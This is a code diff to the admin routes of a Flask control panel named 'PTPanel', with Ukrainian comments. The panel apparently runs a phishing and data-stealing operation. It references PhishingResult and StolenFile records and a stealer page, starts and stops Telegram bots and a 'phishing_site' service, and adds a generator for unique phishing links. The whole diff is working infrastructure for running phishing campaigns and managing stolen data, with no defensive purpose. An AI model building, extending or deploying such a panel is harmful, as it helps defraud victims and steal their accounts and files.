@@ -1,8 +1,9 @@
 # web/admin/routes.py
 from flask import Blueprint, render_template, request, flash, redirect, url_for, session, jsonify
 from core.database import db_manager
-from models.db_models import Admin, Account, PhishingResult, StolenFile, SystemLog
+from models.db_models import Admin, Account, PhishingResult, StolenFile, Service, SystemLog, UserConfig
 from core.security import verify_password, hash_password
+from core.config_manager import config_manager
 import logging
 from datetime import datetime
 from functools import wraps
@@ -53,9 +54,15 @@ def admin_login():
                 admin.last_login = datetime.utcnow()
                 db_session.commit()
                 
+                # Оновлюємо конфігурацію після логіну
+                from config import config
+                config.refresh_telegram_config(admin.id)
+                
                 flash(f'Вітаємо, {admin.username}! Успішний вхід в систему.', 'success')
                 logger.info(f"Admin {admin.username} logged in")
-                return redirect(url_for('admin.admin_dashboard'))
+                
+                # Після логіну перекидаємо на Settings
+                return redirect(url_for('admin.admin_settings'))
             else:
                 flash('Невірний логін або пароль!', 'danger')
                 logger.warning(f"Failed login attempt for username: {username}")
@@ -151,21 +158,272 @@ def admin_stealer():
     finally:
         db_session.close()
 
+# web/admin/routes.py - ДОДАЄМО ФУНКЦІЮ ДЛЯ SERVICES
 @admin_bp.route('/services')
 @login_required
 def admin_services():
     """Сервіси та білдер посилань"""
+    from core.config_manager import config_manager
+    from core.service_manager import service_manager
+    
+    # Завантажуємо налаштування для валідації
+    telegram_config = config_manager.load_user_config(session['admin_id'], 'telegram')
+    bots_config = config_manager.load_user_config(session['admin_id'], 'bots')
+    
+    # Перевіряємо валідність налаштувань
+    validation_errors = []
+    has_telegram_api = bool(telegram_config.get('api_id') and telegram_config.get('api_hash'))
+    can_start_admin_bot = bool(bots_config.get('admin_token'))
+    can_start_webapp_bot = bool(bots_config.get('webapp_token'))
+    can_start_classic_bot = bool(bots_config.get('classic_token'))
+    can_start_multitool_bot = bool(bots_config.get('multitool_token'))
+    
+    # Додаємо помилки валідації
+    if not has_telegram_api:
+        validation_errors.append("Telegram API ID and Hash are required for bot functionality")
+    if not can_start_admin_bot:
+        validation_errors.append("Admin Bot token is missing")
+    if not can_start_webapp_bot:
+        validation_errors.append("WebApp Bot token is missing")
+    if not can_start_classic_bot:
+        validation_errors.append("Classic Bot token is missing")
+    if not can_start_multitool_bot:
+        validation_errors.append("Multitool Bot token is missing")
+    
+    # Отримуємо статуси сервісів
+    services_status = {
+        'admin_bot': service_manager.get_service_status('admin_bot'),
+        'webapp_bot': service_manager.get_service_status('webapp_bot'),
+        'classic_bot': service_manager.get_service_status('classic_bot'),
+        'multitool_bot': service_manager.get_service_status('multitool_bot'),
+        'phishing_site': service_manager.get_service_status('phishing_site')
+    }
+    
     return render_template('admin/services.html',
                          app_name="PTPanel",
-                         current_user={'username': session.get('admin_username')})
+                         current_user={'username': session.get('admin_username')},
+                         services_status=services_status,
+                         validation_errors=validation_errors,
+                         has_telegram_api=has_telegram_api,
+                         can_start_admin_bot=can_start_admin_bot,
+                         can_start_webapp_bot=can_start_webapp_bot,
+                         can_start_classic_bot=can_start_classic_bot,
+                         can_start_multitool_bot=can_start_multitool_bot)
 
-@admin_bp.route('/settings')
+# Додаємо API endpoints для керування сервісами
+@admin_bp.route('/services/start/<service_name>', methods=['POST'])
+@login_required
+def start_service(service_name):
+    """Запуск сервісу"""
+    try:
+        from core.service_manager import service_manager
+        from core.config_manager import config_manager
+        
+        # Перевіряємо валідність налаштувань перед запуском
+        if service_name.endswith('_bot'):
+            bots_config = config_manager.load_user_config(session['admin_id'], 'bots')
+            telegram_config = config_manager.load_user_config(session['admin_id'], 'telegram')
+            
+            # Перевірка токену бота
+            token_key = service_name.replace('_bot', '_token')
+            if not bots_config.get(token_key):
+                return jsonify({'success': False, 'error': f'Missing {service_name} token'})
+            
+            # Перевірка Telegram API
+            if not telegram_config.get('api_id') or not telegram_config.get('api_hash'):
+                return jsonify({'success': False, 'error': 'Telegram API not configured'})
+        
+        success = service_manager.start_service(service_name)
+        return jsonify({'success': success})
+        
+    except Exception as e:
+        logger.error(f"Service start error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@admin_bp.route('/services/stop/<service_name>', methods=['POST'])
+@login_required
+def stop_service(service_name):
+    """Зупинка сервісу"""
+    try:
+        from core.service_manager import service_manager
+        success = service_manager.stop_service(service_name)
+        return jsonify({'success': success})
+        
+    except Exception as e:
+        logger.error(f"Service stop error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@admin_bp.route('/services/restart/<service_name>', methods=['POST'])
+@login_required
+def restart_service(service_name):
+    """Перезапуск сервісу"""
+    try:
+        from core.service_manager import service_manager
+        from core.config_manager import config_manager
+        
+        # Перевіряємо валідність налаштувань перед перезапуском
+        if service_name.endswith('_bot'):
+            bots_config = config_manager.load_user_config(session['admin_id'], 'bots')
+            telegram_config = config_manager.load_user_config(session['admin_id'], 'telegram')
+            
+            token_key = service_name.replace('_bot', '_token')
+            if not bots_config.get(token_key):
+                return jsonify({'success': False, 'error': f'Missing {service_name} token'})
+            
+            if not telegram_config.get('api_id') or not telegram_config.get('api_hash'):
+                return jsonify({'success': False, 'error': 'Telegram API not configured'})
+        
+        success = service_manager.restart_service(service_name)
+        return jsonify({'success': success})
+        
+    except Exception as e:
+        logger.error(f"Service restart error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@admin_bp.route('/services/start_all', methods=['POST'])
+@login_required
+def start_all_services():
+    """Запуск всіх сервісів"""
+    try:
+        from core.service_manager import service_manager
+        from core.config_manager import config_manager
+        
+        # Перевіряємо налаштування перед запуском
+        bots_config = config_manager.load_user_config(session['admin_id'], 'bots')
+        telegram_config = config_manager.load_user_config(session['admin_id'], 'telegram')
+        
+        validation_errors = []
+        
+        if not telegram_config.get('api_id') or not telegram_config.get('api_hash'):
+            validation_errors.append('Telegram API not configured')
+        
+        bot_services = ['admin_bot', 'webapp_bot', 'classic_bot', 'multitool_bot']
+        for service in bot_services:
+            token_key = service.replace('_bot', '_token')
+            if not bots_config.get(token_key):
+                validation_errors.append(f'Missing {service} token')
+        
+        if validation_errors:
+            return jsonify({'success': False, 'error': '; '.join(validation_errors)})
+        
+        success = service_manager.start_all_services()
+        return jsonify({'success': success})
+        
+    except Exception as e:
+        logger.error(f"Start all services error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@admin_bp.route('/services/stop_all', methods=['POST'])
+@login_required
+def stop_all_services():
+    """Зупинка всіх сервісів"""
+    try:
+        from core.service_manager import service_manager
+        success = service_manager.stop_all_services()
+        return jsonify({'success': success})
+        
+    except Exception as e:
+        logger.error(f"Stop all services error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@admin_bp.route('/services/generate_link', methods=['POST'])
+@login_required
+def generate_link():
+    """Генерація унікального посилання"""
+    try:
+        data = request.get_json()
+        redirect_url = data.get('url', '')
+        
+        if not redirect_url:
+            return jsonify({'success': False, 'error': 'URL is required'})
+        
+        # Генеруємо унікальний ідентифікатор
+        import uuid
+        unique_id = str(uuid.uuid4())[:8]
+        
+        # Створюємо посилання
+        generated_link = f"{request.host_url}phishing/{unique_id}"
+        
+        # Зберігаємо в базу даних (потім реалізуємо)
+        # save_unique_link(unique_id, redirect_url, session['admin_id'])
+        
+        return jsonify({
+            'success': True,
+            'generated_link': generated_link,
+            'unique_id': unique_id
+        })
+        
+    except Exception as e:
+        logger.error(f"Link generation error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@admin_bp.route('/settings', methods=['GET'])
 @login_required
 def admin_settings():
-    """Налаштування"""
+    """Сторінка налаштувань"""
+    # Завантажуємо всі налаштування
+    settings = {
+        'telegram': config_manager.load_user_config(session['admin_id'], 'telegram'),
+        'server': config_manager.load_user_config(session['admin_id'], 'server'),
+        'bots': config_manager.load_user_config(session['admin_id'], 'bots'),
+        'additional': config_manager.load_user_config(session['admin_id'], 'additional')
+    }
+    
     return render_template('admin/settings.html',
                          app_name="PTPanel",
-                         current_user={'username': session.get('admin_username')})
+                         current_user={'username': session.get('admin_username')},
+                         settings=settings)
+
+@admin_bp.route('/settings/save/<config_type>', methods=['POST'])
+@login_required
+def save_settings(config_type):
+    """Збереження налаштувань"""
+    try:
+        data = request.get_json()
+        success = config_manager.save_user_config(session['admin_id'], config_type, data)
+        
+        if success:
+            # Оновлюємо конфігурацію
+            from config import config
+            config.refresh_telegram_config(session['admin_id'])
+            
+        return jsonify({'success': success})
+        
+    except Exception as e:
+        logger.error(f"Settings save error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@admin_bp.route('/settings/change_password', methods=['POST'])
+@login_required
+def change_password():
+    """Зміна пароля адміна"""
+    try:
+        data = request.get_json()
+        new_password = data.get('new_password')
+        confirm_password = data.get('confirm_password')
+        
+        if not new_password:
+            return jsonify({'success': False, 'error': 'Пароль не може бути порожнім'})
+        
+        if new_password != confirm_password:
+            return jsonify({'success': False, 'error': 'Паролі не співпадають'})
+        
+        db_session = db_manager.get_session()
+        admin = db_session.query(Admin).filter(Admin.id == session['admin_id']).first()
+        
+        if admin:
+            admin.password_hash = hash_password(new_password)
+            db_session.commit()
+            logger.info(f"Password changed for admin {admin.username}")
+            return jsonify({'success': True})
+        else:
+            return jsonify({'success': False, 'error': 'Адмін не знайдений'})
+            
+    except Exception as e:
+        logger.error(f"Password change error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+    finally:
+        db_session.close()
 
 @admin_bp.route('/logs')
 @login_required
